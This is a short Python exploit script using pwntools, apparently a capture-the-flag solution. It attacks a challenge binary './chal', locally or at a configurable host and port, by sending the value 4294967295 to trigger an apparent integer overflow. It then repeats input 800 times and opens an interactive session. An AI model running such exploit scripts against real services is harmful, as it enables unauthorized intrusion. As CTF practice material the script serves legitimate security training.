#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chal'

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.log_level = 'debug'

binf = ELF(BIN_FILE)

def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    if args.GDB:
        return gdb.debug(BIN_FILE)

    return process(BIN_FILE)

def attack(io):
    io.sendlineafter('alpaca.', b'4294967295')
    io.sendlineafter('llama.', b'1')
    
    for _ in range(800):
        io.sendline(b'1')
        io.recv(timeout=0.2)

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
